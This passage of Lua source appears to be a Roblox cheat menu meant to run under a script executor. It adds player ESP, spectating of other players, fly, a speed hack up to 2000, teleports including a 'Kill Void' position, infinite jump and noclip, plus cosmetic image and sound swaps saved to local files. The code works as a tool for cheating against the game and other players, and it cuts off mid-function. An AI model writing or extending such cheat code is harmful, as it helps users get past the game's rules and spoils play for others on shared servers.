						if v19 and v19.Parent then
							v19:Destroy()
						end
					end

					plotOwnerBillboards = {}

					for _, v19 in pairs(plotOwnerConnections) do
						pcall(function()
							v19:Disconnect()
						end)
					end

					plotOwnerConnections = {}
				end

				v18:CreateToggle({
					Name = "Slot Time ESP",
					Default = false,
					Callback = function(arg)
						flag11 = arg

						if arg then
							fn25()
						else
							fn24()
						end
					end,
				})

				v18:CreateToggle({
					Name = "Plot Owners ESP",
					Default = false,
					Callback = function(arg)
						plotOwnerESPEnabled = arg

						if arg then
							fn27()
						else
							fn28()
						end
					end,
				})
			end

			do
				local v18 = _G.VisualTab:CreateBlock({ Name = "Custom Blackhole", Side = "Right", ImageID = "84179715514460" })
				v18:CreateSection("Works with Texture ID")
				v18:CreateSection("Look for - Roblox Store")
				local HttpService = game:GetService("HttpService")

				if not isfolder("Mercury") then
					makefolder("Mercury")
				end

				local tbl16 = { ["Default Image"] = "72944567708528" }
				local tbl17 = {}
				local tbl18 = {}

				local function fn20()
					local ok, result = pcall(function()
						writefile("Mercury/CustomHoles.json", HttpService:JSONEncode(tbl17))
					end)

					if not ok then
						warn("Failed to save holes: " .. tostring(result))
					end
				end

				local function fn21()
					if isfile("Mercury/CustomHoles.json") then
						local ok, result = pcall(function()
							return HttpService:JSONDecode(readfile("Mercury/CustomHoles.json"))
						end)

						if ok and type(result) == "table" then
							tbl17 = result
						end
					end
				end

				local function fn22()
					table.clear(tbl18)

					for k, v19 in pairs(tbl16) do
						tbl18[k] = v19
					end

					for k, v19 in pairs(tbl17) do
						tbl18[k] = v19
					end
				end

				fn21()
				fn22()

				local function fn23()
					local tbl19 = {}

					for k in pairs(tbl18) do
						table.insert(tbl19, k)
					end

					table.sort(tbl19)
					return tbl19
				end

				local str5 = "Default Image"
				local defaultImage = tbl18[str5]
				local savedAs = ""
				local str6 = ""
				local flag11 = false

				if _G.BlackholeConn then
					_G.BlackholeConn:Disconnect()
					_G.BlackholeConn = nil
				end

				local function fn24(arg)
					local v19 = fn23()

					if arg and arg.Refresh then
						arg:Refresh(v19, str5)
					end
				end

				local function fn25(arg)
					local v19 = string.match(tostring(arg), "%d+")
					if v19 then
						return "rbxthumb://type=Asset&id=" .. v19 .. "&w=420&h=420"
					end
					return arg
				end

				local function fn26(arg)
					local hole = arg:WaitForChild("Hole", 3)
					if not hole then
						return
					end
					hole.Transparency = 1
					local billboardGui = hole:WaitForChild("BillboardGui", 3)
					if not billboardGui then
						return
					end
					local small = billboardGui:WaitForChild("Small", 3)
					local large = billboardGui:WaitForChild("Large", 3)
					local v19 = fn25(defaultImage)

					if small then
						small.BackgroundTransparency = 1
						small.ImageColor3 = Color3.fromRGB(255, 255, 255)
						small.Size = UDim2.new(0.5, 0, 0.5, 0)
						small.Image = v19
					end

					if large then
						large.BackgroundTransparency = 1
						large.ImageColor3 = Color3.fromRGB(255, 255, 255)
						large.Size = UDim2.new(0.5, 0, 0.5, 0)
						large.Image = v19
					end
				end

				local v19 = v18:CreateDropdown({
					Name = "Select Custom Hole",
					Items = fn23(),
					Default = "Default Image",
					Callback = function(arg)
						str5 = arg
						defaultImage = tbl18[arg]

						if flag11 then
							for _, child in ipairs(workspace:GetChildren()) do
								if child:FindFirstChild("Hole") then
									task.spawn(function()
										fn26(child)
									end)
								end
							end
						end
					end,
				})

				v18:CreateInput({
					Name = "New Config Name",
					Default = "",
					Placeholder = "Enter name...",
					Callback = function(arg)
						savedAs = arg
					end,
				})

				v18:CreateInput({
					Name = "Asset ID / URL",
					Default = "",
					Placeholder = "Enter ID...",
					Callback = function(arg)
						str6 = arg
					end,
				})

				v18:CreateButton({
					Name = "Save Current Config",
					Callback = function()
						if savedAs == "" or savedAs == nil then
							if _G.Notify then
								_G.Notify("Custom Hole", "Please enter a name!", 2)
							end

							return
						end

						if str6 == "" or str6 == nil then
							if _G.Notify then
								_G.Notify("Custom Hole", "Please enter Image ID!", 2)
							end

							return
						end

						tbl17[savedAs] = str6
						fn20()
						fn22()
						fn24(v19)

						if _G.Notify then
							_G.Notify("Custom Hole", "Saved as: " .. savedAs, 2)
						end

						if _G.PlaySound and _G.Sounds then
							_G.PlaySound(_G.Sounds.Notify)
						end
					end,
				})

				v18:CreateButton({
					Name = "Delete Selected Config",
					Callback = function()
						if tbl16[str5] then
							if _G.Notify then
								_G.Notify("Error", "Cannot delete built-in config!", 2)
							end

							if _G.PlaySound and _G.Sounds then
								_G.PlaySound(_G.Sounds.Kick)
							end

							return
						end

						if tbl17[str5] then
							tbl17[str5] = nil
							fn20()
							fn22()
							str5 = "Default Image"
							defaultImage = tbl18["Default Image"]
							fn24(v19)

							if _G.Notify then
								_G.Notify("Custom Hole", "Removed.", 2)
							end
						end
					end,
				})

				v18:CreateToggle({
					Name = "Enable Custom Hole",
					Default = false,
					Callback = function(arg)
						flag11 = arg

						if flag11 then
							for _, child in ipairs(workspace:GetChildren()) do
								if child:FindFirstChild("Hole") then
									task.spawn(function()
										fn26(child)
									end)
								end
							end

							if _G.BlackholeConn then
								_G.BlackholeConn:Disconnect()
							end

							_G.BlackholeConn = workspace.ChildAdded:Connect(function(child)
								task.spawn(function()
									fn26(child)
								end)
							end)

							if _G.Notify then
								_G.Notify("Custom Hole", "Enabled", 2)
							end
						else
							if _G.BlackholeConn then
								_G.BlackholeConn:Disconnect()
								_G.BlackholeConn = nil
							end

							if _G.Notify then
								_G.Notify("Custom Hole", "Disabled", 2)
							end
						end
					end,
				})
			end

			do
				local v18 = _G.VisualTab:CreateBlock({ Name = "Your Notify Sound", Side = "Left", ImageID = "12339192128" })
				v18:CreateSection("Works with Sound ID")
				v18:CreateSection("Look for - Roblox Audio")
				local HttpService = game:GetService("HttpService")

				if not isfolder("Mercury") then
					makefolder("Mercury")
				end

				local tbl16 = {}
				local tbl17 = {}
				local tbl18 = {}

				local function fn20()
					local ok, result = pcall(function()
						writefile("Mercury/CustomSounds.json", HttpService:JSONEncode(tbl17))
					end)

					if not ok then
						warn("Failed to save sounds: " .. tostring(result))
					end
				end

				local function fn21()
					if isfile("Mercury/CustomSounds.json") then
						local ok, result = pcall(function()
							return HttpService:JSONDecode(readfile("Mercury/CustomSounds.json"))
						end)

						if ok and type(result) == "table" then
							tbl17 = result
						end
					end
				end

				local function fn22()
					table.clear(tbl18)

					for k, v19 in pairs(tbl16) do
						tbl18[k] = v19
					end

					for k, v19 in pairs(tbl17) do
						tbl18[k] = v19
					end
				end

				fn21()
				fn22()

				local function fn23()
					local tbl19 = {}

					for k in pairs(tbl18) do
						table.insert(tbl19, k)
					end

					table.sort(tbl19)
					return tbl19
				end

				local playing = nil
				local v19 = nil
				local savedAs = ""
				local str5 = ""
				local flag11 = false
				local sound2 = nil

				local function fn24()
					if not sound2 then
						sound2 = Instance.new("Sound")
						sound2.Volume = 0.5
						sound2.Parent = game:GetService("Workspace")
					end

					if v19 then
						sound2.SoundId = "rbxassetid://" .. v19
					end

					local notify = _G.Notify

					_G.Notify = function(arg, arg2, arg3)
						pcall(function()
							if sound2 then
								sound2:Stop()
								sound2:Play()
							end
						end)

						_G.Library:Notify({ Title = arg, Content = arg2, Duration = arg3 or 5, ImageID = "101017996369612" })
					end

					if notify and not flag11 then
						_G.Notify = notify
					end
				end

				local function fn25(arg)
					local v20 = fn23()

					if arg and arg.Refresh then
						arg:Refresh(v20, playing)
					end
				end

				local v20 = v18:CreateDropdown({
					Name = "Select Custom Sound",
					Items = fn23(),
					Default = nil,
					Callback = function(arg)
						playing = arg
						v19 = tbl18[arg]

						if flag11 and sound2 then
							fn24()
						end
					end,
				})

				v18:CreateInput({
					Name = "New Config Name",
					Default = "",
					Placeholder = "Enter name...",
					Callback = function(arg)
						savedAs = arg
					end,
				})

				v18:CreateInput({
					Name = "Sound ID / URL",
					Default = "",
					Placeholder = "Enter Sound ID...",
					Callback = function(arg)
						str5 = arg
					end,
				})

				v18:CreateButton({
					Name = "Test Sound",
					Callback = function()
						if sound2 and v19 then
							pcall(function()
								sound2:Stop()
								task.wait(0.1)
								sound2:Play()
								_G.Notify("Test Sound", "Playing: " .. playing, 2)
							end)
						elseif v19 then
							local sound3 = Instance.new("Sound")
							sound3.SoundId = "rbxassetid://" .. v19
							sound3.Volume = 0.5
							sound3.Parent = game:GetService("Workspace")
							sound3:Play()
							_G.Notify("Test Sound", "Playing: " .. playing, 2)
							task.wait(3)
							sound3:Destroy()
						else
							_G.Notify("Test Sound", "No sound selected!", 2)
						end
					end,
				})

				v18:CreateButton({
					Name = "Save Current Config",
					Callback = function()
						if savedAs == "" or savedAs == nil then
							if _G.Notify then
								_G.Notify("Custom Sound", "Please enter a name!", 2)
							end

							return
						end

						if str5 == "" or str5 == nil then
							if _G.Notify then
								_G.Notify("Custom Sound", "Please enter Sound ID!", 2)
							end

							return
						end

						tbl17[savedAs] = str5
						fn20()
						fn22()
						fn25(v20)

						if _G.Notify then
							_G.Notify("Custom Sound", "Saved as: " .. savedAs, 2)
						end
					end,
				})

				v18:CreateButton({
					Name = "Delete Selected Config",
					Callback = function()
						if tbl16[playing] then
							if _G.Notify then
								_G.Notify("Error", "Cannot delete built-in config!", 2)
							end

							return
						end

						if tbl17[playing] then
							tbl17[playing] = nil
							fn20()
							fn22()
							playing = nil
							v19 = nil
							fn25(v20)

							if flag11 then
								fn24()
							end

							if _G.Notify then
								_G.Notify("Custom Sound", "Removed.", 2)
							end
						end
					end,
				})

				v18:CreateSlider({
					Name = "Sound Volume",
					Min = 0,
					Max = 100,
					Default = 50,
					Callback = function(arg)
						if sound2 then
							sound2.Volume = arg / 100
						end
					end,
				})

				v18:CreateToggle({
					Name = "Enable Custom Sound",
					Default = false,
					Callback = function(arg)
						flag11 = arg

						if flag11 then
							if not sound2 then
								sound2 = Instance.new("Sound")
								sound2.Volume = 0.5
								sound2.Parent = game:GetService("Workspace")
							end

							fn24()
							_G.Notify("Custom Sound", "Enabled - " .. (playing or "None"), 2)
						else
							if sound2 then
								sound2:Stop()
								sound2.SoundId = "rbxassetid://8578195318"
							end

							_G.Notify = function(arg2, arg3, arg4)
								pcall(function()
									if sound2 then
										sound2:Stop()
										sound2:Play()
									end
								end)

								_G.Library:Notify({ Title = arg2, Content = arg3, Duration = arg4 or 5, ImageID = "101017996369612" })
							end

							_G.Notify("Custom Sound", "Disabled", 2)
						end
					end,
				})
			end

			do
				local lp = _G.LP
				local ps2 = _G.PS
				local rs = _G.RS
				local v18 = _G.VisualTab:CreateBlock({ Name = "Spectate", Side = "Right", ImageID = "12279729389" })
				local flag11 = false
				local v19 = nil
				local currentCamera = workspace.CurrentCamera
				local tbl16 = {}
				local n26 = 1

				local function fn20()
					tbl16 = {}

					for _, player in pairs(ps2:GetPlayers()) do
						if player ~= lp then
							table.insert(tbl16, player)
						end
					end
				end

				local function fn21(arg)
					return arg and arg.Character and arg.Character:FindFirstChild("Humanoid") and arg.Character.Humanoid.Health > 0
				end

				local fn22 = nil

				fn22 = function(arg)
					if not flag11 then
						return
					end

					if fn21(arg) then
						v19 = arg
						currentCamera.CameraSubject = arg.Character.Humanoid
						currentCamera.CameraType = Enum.CameraType.Custom
					elseif #tbl16 > 0 then
						local v20 = n26

						while true do
							n26 += 1

							if #tbl16 < n26 then
								n26 = 1
							end

							if n26 ~= v20 then
								if not fn21(tbl16[n26]) then
									continue
								end
							end

							break
						end

						if fn21(tbl16[n26]) then
							fn22(tbl16[n26])
						else
							currentCamera.CameraSubject = lp.Character:FindFirstChild("Humanoid")
							v19 = nil
						end
					else
						currentCamera.CameraSubject = lp.Character:FindFirstChild("Humanoid")
						v19 = nil
					end
				end

				local function fn23()
					fn20()

					if tbl16[n26] and fn21(tbl16[n26]) then
						fn22(tbl16[n26])
					else
						for i, v20 in ipairs(tbl16) do
							if fn21(v20) then
								n26 = i
								fn22(v20)
								break
							end
						end
					end
				end

				local function fn24()
					flag11 = false

					if lp.Character and lp.Character:FindFirstChild("Humanoid") then
						currentCamera.CameraSubject = lp.Character.Humanoid
						currentCamera.CameraType = Enum.CameraType.Custom
					end

					v19 = nil
				end

				local v20 = v18:CreateDropdown({
					Name = "Select Player",
					Items = {},
					Default = "",
					Callback = function(arg)
						if not arg or arg == "" then
							return
						end
						local v20 = ps2:FindFirstChild(arg:match("%|%s(.+)$") or arg)

						if v20 and v20 ~= lp then
							n26 = 1

							for i, v21 in ipairs(tbl16) do
								if v21 == v20 then
									n26 = i
									break
								end
							end

							if flag11 then
								fn22(v20)
							end
						end
					end,
				})

				local function fn25()
					fn20()
					local tbl17 = {}

					for _, v21 in pairs(tbl16) do
						table.insert(tbl17, v21.DisplayName .. " | " .. v21.Name)
					end

					if #tbl17 == 0 then
						table.insert(tbl17, "No players")
					end

					v20:Refresh(tbl17)
				end

				v18:CreateToggle({
					Name = "Enable Spectate",
					Default = false,
					Callback = function(arg)
						flag11 = arg

						if arg then
							fn25()
							fn23()
						else
							fn24()
						end
					end,
				})

				ps2.PlayerAdded:Connect(function()
					if flag11 then
						fn25()
					end
				end)

				ps2.PlayerRemoving:Connect(function()
					if flag11 then
						fn25()

						if v19 and not v19.Parent then
							fn22(nil)
						end
					end
				end)

				rs.RenderStepped:Connect(function()
					if flag11 and #tbl16 > 0 then
						if v19 and not fn21(v19) then
							fn22(nil)
						end
					end
				end)

				fn25()
			end
		end

		do
			do
				local playerTab = _G.PlayerTab
				local lp = _G.LP
				local rs = _G.RS
				local currentCamera = _G.WS.CurrentCamera
				local uis = _G.UIS or game:GetService("UserInputService")
				local v16 = playerTab:CreateBlock({ Name = "Camera", Side = "Left", ImageID = "78762367851208" })
				local connection = nil
				local connection2 = nil
				local connection3 = nil
				local flag7 = false

				local function fn12()
					if connection then
						connection:Disconnect()
						connection = nil
					end
				end

				local function fn13(arg, arg2, arg3, arg4)
					fn12()
					local now2 = tick()

					connection = rs.RenderStepped:Connect(function()
						local n25 = 1 - (1 - math.clamp((tick() - now2) / arg3, 0, 1)) ^ 3
						local cameraMinZoomDistance = arg + (arg2 - arg) * n25
						lp.CameraMinZoomDistance = cameraMinZoomDistance
						lp.CameraMaxZoomDistance = cameraMinZoomDistance

						if n25 >= 1 then
							fn12()

							if arg4 then
								arg4()
							end
						end
					end)
				end

				local function fn14(arg, arg2)
					if connection2 then
						connection2:Disconnect()
						connection2 = nil
					end

					local fieldOfView = currentCamera.FieldOfView
					local now2 = tick()

					connection2 = rs.RenderStepped:Connect(function()
						local n25 = math.min((tick() - now2) / arg2, 1)
						currentCamera.FieldOfView = fieldOfView + (arg - fieldOfView) * n25

						if n25 >= 1 then
							connection2:Disconnect()
							connection2 = nil
						end
					end)
				end

				v16:CreateToggle({
					Name = "Third Person",
					Default = false,
					Flag = "ThirdPerson",
					Callback = function(arg)
						if arg then
							lp.CameraMode = Enum.CameraMode.Classic

							fn13(0.5, 35, 0.15, function()
								lp.CameraMinZoomDistance = 0.5
								lp.CameraMaxZoomDistance = 1250
							end)
						else
							local cameraMaxZoomDistance = lp.CameraMaxZoomDistance

							if cameraMaxZoomDistance >= 1250 then
								cameraMaxZoomDistance = 35
							end

							fn13(cameraMaxZoomDistance, 0.5, 0.12, function()
								lp.CameraMinZoomDistance = 0.5
								lp.CameraMaxZoomDistance = 0.5
								lp.CameraMode = Enum.CameraMode.LockFirstPerson
							end)
						end
					end,
				})

				v16:CreateSlider({
					Name = "Field of View (FOV)",
					Min = 10,
					Max = 120,
					Default = 70,
					Flag = "FOVValue",
					Callback = function(arg)
						fn14(arg, 0.1)
					end,
				})

				v16:CreateToggle({
					Name = "Shift Lock (mouse look)",
					Default = false,
					Flag = "ShiftLock",
					Callback = function(arg)
						flag7 = arg

						if connection3 then
							connection3:Disconnect()
							connection3 = nil
						end

						if arg then
							connection3 = rs.RenderStepped:Connect(function()
								if flag7 then
									uis.MouseBehavior = Enum.MouseBehavior.LockCenter
								end
							end)
						else
							uis.MouseBehavior = Enum.MouseBehavior.Default
						end
					end,
				})
			end

			local v16
			v16 = _G.PlayerTab:CreateBlock({ Name = "Movement", Side = "Right", ImageID = "9657060536" })
			local lp
			lp = _G.LP
			local cf
			cf = _G.CF
			local v32
			v32 = _G.V3
			local uis
			uis = _G.UIS
			local rs
			rs = _G.RS
			local ws
			ws = _G.WS
			local flag7, n25, fn12, fn13

			do
				local UserInputService = game:GetService("UserInputService")
				game:GetService("Players")
				flag7 = false
				local flag8 = false
				local connection = nil
				local connection2 = nil
				local flag9 = false
				n25 = 1

				local function fn14(arg)
					return arg and arg:FindFirstChild("HumanoidRootPart")
				end

				local function fn15(arg)
					if arg then
						arg.Velocity = v32(0, 0, 0)
						arg.AssemblyLinearVelocity = v32(0, 0, 0)
						arg.RotVelocity = v32(0, 0, 0)
						arg.AssemblyAngularVelocity = v32(0, 0, 0)
					end
				end

				local function fn16()
					flag9 = false

					if connection then
						connection:Disconnect()
						connection = nil
					end

					if connection2 then
						connection2:Disconnect()
						connection2 = nil
					end

					local character = lp.Character

					if character then
						local humanoid = character:FindFirstChildOfClass("Humanoid")

						if humanoid then
							humanoid.PlatformStand = false
						end
					end

					pcall(function()
						workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
					end)
				end

				local function fn17(arg)
					local v17 = lp
					local character = v17.Character or v17.CharacterAdded:Wait()
					local humanoid = character:FindFirstChildOfClass("Humanoid")

					if not humanoid then
						repeat
							task.wait()
						until character:FindFirstChildOfClass("Humanoid")

						humanoid = character:FindFirstChildOfClass("Humanoid")
					end

					local v18 = connection
					local v19

					if connection then
						v19 = v18
					else
						v19 = connection2
					end

					if v19 then
						connection:Disconnect()
						connection2:Disconnect()
					end

					local v20 = fn14(character)
					local tbl5 = { F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0 }
					local tbl6 = { F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0 }
					local n26 = 0

					local function fn18()
						flag9 = true
						local bodyGyro = Instance.new("BodyGyro")
						local bodyVelocity_ = Instance.new("BodyVelocity")
						bodyGyro.P = 90000
						bodyGyro.Parent = v20
						bodyVelocity_.Parent = v20
						bodyGyro.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
						bodyGyro.CFrame = v20.CFrame
						bodyVelocity_.Velocity = Vector3.zero
						bodyVelocity_.MaxForce = Vector3.new(9e9, 9e9, 9e9)

						task.spawn(function()
							while true do
								task.wait()
								local currentCamera = workspace.CurrentCamera

								if not arg and humanoid then
									humanoid.PlatformStand = true
								end

								if tbl5.L + tbl5.R ~= 0 or tbl5.F + tbl5.B ~= 0 or tbl5.Q + tbl5.E ~= 0 then
									n26 = 50
								elseif not (tbl5.L + tbl5.R ~= 0 or tbl5.F + tbl5.B ~= 0 or tbl5.Q + tbl5.E ~= 0) and n26 ~= 0 then
									n26 = 0
								end

								if tbl5.L + tbl5.R ~= 0 or tbl5.F + tbl5.B ~= 0 or tbl5.Q + tbl5.E ~= 0 then
									local p = currentCamera.CFrame.p
									bodyVelocity_.Velocity = (currentCamera.CFrame.LookVector * (tbl5.F + tbl5.B) + currentCamera.CFrame * CFrame.new(tbl5.L + tbl5.R, (tbl5.F + tbl5.B + tbl5.Q + tbl5.E) * 0.2, 0).p - p) * n26
									tbl6 = { F = tbl5.F, B = tbl5.B, L = tbl5.L, R = tbl5.R }
								elseif tbl5.L + tbl5.R == 0 and tbl5.F + tbl5.B == 0 and tbl5.Q + tbl5.E == 0 and n26 ~= 0 then
									local p = currentCamera.CFrame.p
									bodyVelocity_.Velocity = (currentCamera.CFrame.LookVector * (tbl6.F + tbl6.B) + currentCamera.CFrame * CFrame.new(tbl6.L + tbl6.R, (tbl6.F + tbl6.B + tbl5.Q + tbl5.E) * 0.2, 0).p - p) * n26
								else
									bodyVelocity_.Velocity = Vector3.zero
								end

								bodyGyro.CFrame = currentCamera.CFrame
								if flag9 then
									continue
								end
								break
							end

							tbl5 = { F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0 }
							tbl6 = { F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0 }
							n26 = 0
							bodyGyro:Destroy()
							bodyVelocity_:Destroy()

							if humanoid then
								humanoid.PlatformStand = false
							end
						end)
					end

					connection = UserInputService.InputBegan:Connect(function(input, gameProcessed)
						if gameProcessed then
							return
						end

						if input.KeyCode == Enum.KeyCode.W then
							tbl5.F = arg and n25 or 1
						elseif input.KeyCode == Enum.KeyCode.S then
							tbl5.B = -(arg and n25 or 1)
						elseif input.KeyCode == Enum.KeyCode.A then
							tbl5.L = -(arg and n25 or 1)
						elseif input.KeyCode == Enum.KeyCode.D then
							tbl5.R = arg and n25 or 1
						elseif input.KeyCode == Enum.KeyCode.E then
							tbl5.Q = (arg and n25 or 1) * 2
						elseif input.KeyCode == Enum.KeyCode.Q then
							tbl5.E = -(arg and n25 or 1) * 2
						end

						pcall(function()
							camera.CameraType = Enum.CameraType.Track
						end)
					end)

					connection2 = UserInputService.InputEnded:Connect(function(input, gameProcessed)
						if gameProcessed then
							return
						end

						if input.KeyCode == Enum.KeyCode.W then
							tbl5.F = 0
						elseif input.KeyCode == Enum.KeyCode.S then
							tbl5.B = 0
						elseif input.KeyCode == Enum.KeyCode.A then
							tbl5.L = 0
						elseif input.KeyCode == Enum.KeyCode.D then
							tbl5.R = 0
						elseif input.KeyCode == Enum.KeyCode.E then
							tbl5.Q = 0
						elseif input.KeyCode == Enum.KeyCode.Q then
							tbl5.E = 0
						end
					end)

					fn18()
				end

				fn12 = function()
					if flag7 then
						return
					end
					flag7 = true
					flag8 = true
					fn16()
					task.wait()
					fn17(true)
				end

				fn13 = function()
					flag7 = false
					flag8 = false
					fn16()
				end

				local function fn18()
					if flag8 then
						flag7 = true
						fn16()
						task.wait()
						fn17(true)
					end
				end

				local function fn19()
					if speedEnabled then
						local character = lp.Character

						if character then
							local humanoid = character:FindFirstChildOfClass("Humanoid")

							if humanoid then
								humanoid.WalkSpeed = speedValue
							end
						end
					end
				end

				lp.CharacterAdded:Connect(function()
					task.wait(0.5)
					fn18()
					fn19()
				end)

				local tpLocations = {
					"Pink House",
					"Green House",
					"Purple House",
					"China House",
					"Blue House",
					"Spawn",
					"Base Void",
					"Kill Void",
				}

				local tpPositions = {
					["Pink House"] = cf(-491, -7, -166),
					["Green House"] = cf(-535, -7, 93),
					["Purple House"] = cf(250, -6, 463),
					["China House"] = cf(554, 123, -72),
					["Blue House"] = cf(510, 83, -339),
					Spawn = cf(3, -7.5, -2),
					["Base Void"] = cf(100000, 0, 0),
					["Kill Void"] = cf(1e11, 0, 0),
				}

				_G.tpLocations = tpLocations
				_G.tpPositions = tpPositions
				v16:CreateSection("Teleport")
				local loopTPEnabled = false
				local thread = nil
				local spawn_ = tpPositions.Spawn
				_G.loopTPEnabled = loopTPEnabled
				_G.loopTPThread = thread
				_G.currentTPTarget = spawn_

				v16:CreateToggle({
					Name = "Loop Teleport",
					Default = false,
					Callback = function(arg)
						if arg then
							if loopTPEnabled then
								return
							end
							loopTPEnabled = true

							thread = task.spawn(function()
								while loopTPEnabled do
									local character = lp.Character

									if character then
										local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

										if humanoidRootPart and spawn_ then
											humanoidRootPart.CFrame = spawn_
											fn15(humanoidRootPart)
										end
									end

									task.wait()
								end
							end)
						else
							loopTPEnabled = false

							if thread then
								task.cancel(thread)
								thread = nil
							end
						end
					end,
				})

				v16:CreateDropdown({
					Name = "Teleport Location",
					Items = tpLocations,
					Default = "Spawn",
					Callback = function(arg)
						spawn_ = tpPositions[arg]
					end,
				})

				v16:CreateKeybind({
					Name = "Teleport Once",
					Default = Enum.KeyCode.P,
					HoldToInteract = false,
					Callback = function()
						local character = lp.Character

						if character then
							local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

							if humanoidRootPart and spawn_ then
								humanoidRootPart.CFrame = spawn_
								fn15(humanoidRootPart)
							end
						end
					end,
				})

				v16:CreateKeybind({
					Name = "Teleport to Mouse",
					Default = Enum.KeyCode.Z,
					HoldToInteract = false,
					Callback = function()
						local character = lp.Character

						if character and character:FindFirstChild("HumanoidRootPart") then
							local mouse = lp:GetMouse()
							local position = mouse.Hit.Position

							if mouse.Target then
								local humanoidRootPart = character.HumanoidRootPart
								local cFrame = humanoidRootPart.CFrame
								local v17 = cf(position + v32(0, 3, 0))
								local n26 = 0.05
								local now2 = tick()
								local connection3 = nil

								connection3 = rs.Heartbeat:Connect(function()
									local n27 = math.min((tick() - now2) / n26, 1)
									humanoidRootPart.CFrame = cFrame:Lerp(v17, n27)
									fn15(humanoidRootPart)

									if n27 >= 1 then
										connection3:Disconnect()
									end
								end)
							end
						end
					end,
				})
			end

			v16:CreateSection("Speed")

			do
				local flag8 = false
				local walkSpeed = 16
				local walkSpeed2 = nil
				local connection = nil
				local v17 = nil
				local v18 = nil
				local flag9 = false

				local function fn14(arg)
					flag8 = false

					if connection then
						connection:Disconnect()
						connection = nil
					end

					if v17 then
						v17:Disconnect()
						v17 = nil
					end

					local character = lp.Character

					if character then
						local humanoid = character:FindFirstChildOfClass("Humanoid")

						if humanoid then
							humanoid.WalkSpeed = walkSpeed2 or 16
						end
					end

					if not arg and v18 then
						v18:Set(false)
					end
				end

				local function fn15(arg)
					if flag8 then
						return
					end
					local character = lp.Character

					if character then
						local humanoid = character:FindFirstChildOfClass("Humanoid")

						if humanoid then
							walkSpeed2 = humanoid.WalkSpeed
							humanoid.WalkSpeed = walkSpeed
						end
					end

					flag8 = true

					if connection then
						connection:Disconnect()
					end

					connection = rs.Stepped:Connect(function(time_, deltaTime)
						if not flag8 then
							return
						end
						local character2 = lp.Character
						if not character2 then
							return
						end
						local humanoidRootPart = character2:FindFirstChild("HumanoidRootPart")
						local humanoid = character2:FindFirstChildOfClass("Humanoid")
						if not humanoidRootPart or not humanoid then
							return
						end
						humanoid.WalkSpeed = walkSpeed
						local moveDirection = humanoid.MoveDirection

						if moveDirection.Magnitude > 0 then
							local n26 = moveDirection.Unit * walkSpeed * deltaTime
							humanoidRootPart.CFrame = humanoidRootPart.CFrame + v32(n26.X, 0, n26.Z)
						end
					end)

					if not arg and v18 then
						v18:Set(true)
					end
				end

				lp.CharacterAdded:Connect(function(character)
					task.wait(0.05)

					if flag9 then
						flag9 = false
						fn15(true)
					end

					local humanoid = character:FindFirstChildOfClass("Humanoid")

					if humanoid then
						walkSpeed2 = 16

						if flag8 then
							humanoid.WalkSpeed = walkSpeed
						end

						humanoid.HealthChanged:Connect(function(health)
							if health <= 0 and flag8 then
								flag9 = true
								fn14(true)
							end
						end)
					end
				end)

				if lp.Character then
					task.wait(0.03)
					local humanoid = lp.Character:FindFirstChildOfClass("Humanoid")

					if humanoid then
						walkSpeed2 = 16

						if flag8 then
							humanoid.WalkSpeed = walkSpeed
						end
					end
				end

				v16:CreateSlider({
					Name = "Speed Control",
					Min = 10,
					Max = 2000,
					Default = 16,
					Callback = function(walkSpeed3)
						walkSpeed = walkSpeed3

						if flag8 then
							local character = lp.Character

							if character then
								local humanoid = character:FindFirstChildOfClass("Humanoid")

								if humanoid then
									humanoid.WalkSpeed = walkSpeed3
								end
							end
						end
					end,
				})

				v18 = v16:CreateToggle({
					Name = "Enable Speed",
					Default = false,
					Callback = function(arg)
						if arg then
							flag9 = false
							fn15()
						else
							flag9 = false
							fn14()
						end
					end,
				})

				v16:CreateKeybind({
					Name = "Speed Toggle Key",
					Default = Enum.KeyCode.Y,
					Callback = function()
						if flag8 then
							flag9 = false
							fn14()
						else
							flag9 = false
							fn15()
						end
					end,
				})
			end

			v16:CreateSection("Other")

			do
				local jumpPower = 50
				local jumpEnabled = false
				local connection = nil
				_G.jumpPower = jumpPower
				_G.jumpEnabled = jumpEnabled
				_G.jumpConnection = connection

				v16:CreateSlider({
					Name = "Jump Power",
					Min = 5,
					Max = 500,
					Default = 50,
					Callback = function(arg)
						jumpPower = arg
					end,
				})

				v16:CreateToggle({
					Name = "Infinite Jump",
					Default = false,
					Callback = function(arg)
						if arg then
							jumpEnabled = true

							if connection then
								connection:Disconnect()
							end

							connection = uis.JumpRequest:Connect(function()
								if jumpEnabled and lp.Character then
									local humanoid = lp.Character:FindFirstChildOfClass("Humanoid")

									if humanoid and humanoid.Health > 0 then
										humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
										local humanoidRootPart = lp.Character:FindFirstChild("HumanoidRootPart")

										if humanoidRootPart then
											humanoidRootPart.Velocity = v32(humanoidRootPart.Velocity.X, jumpPower, humanoidRootPart.Velocity.Z)
										end
									end
								end
							end)
						else
							jumpEnabled = false

							if connection then
								connection:Disconnect()
								connection = nil
							end

							local character = lp.Character

							if character then
								local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

								if humanoidRootPart then
									humanoidRootPart.Velocity = v32(humanoidRootPart.Velocity.X, 0, humanoidRootPart.Velocity.Z)
								end
							end
						end
					end,
				})
			end

			do
				local flag8 = false
				local connection = nil
				local tbl5 = {}
				local flag9 = false

				task.spawn(function()
					if ws:FindFirstChild("Map") and ws.Map:FindFirstChild("AlwaysHereTweenedObjects") then
						local objectModel = ws.Map.AlwaysHereTweenedObjects.Ocean.Object.ObjectModel

						if objectModel then
							for _, child in pairs(objectModel:GetChildren()) do
								if child:IsA("Part") or child:IsA("UnionOperation") or child:IsA("BasePart") or child:IsA("MeshPart") then
									table.insert(tbl5, { part = child, originalCollide = child.CanCollide })
								end
							end
						end
					end
				end)

				v16:CreateToggle({
					Name = "Noclip",
					Default = false,
					Callback = function(arg)
						flag8 = arg

						if connection then
							connection:Disconnect()
							connection = nil
						end

						if arg then
							connection = rs.RenderStepped:Connect(function()
								if not flag8 then
									return
								end
								local character = lp.Character

								if character then
									for _, child in pairs(character:GetChildren()) do
										if child:IsA("BasePart") and child.Name ~= "CamPart" and child.Name ~= "HumanoidRootPart" and not child:IsA("Accessory") then
											child.CanCollide = false
										end
									end
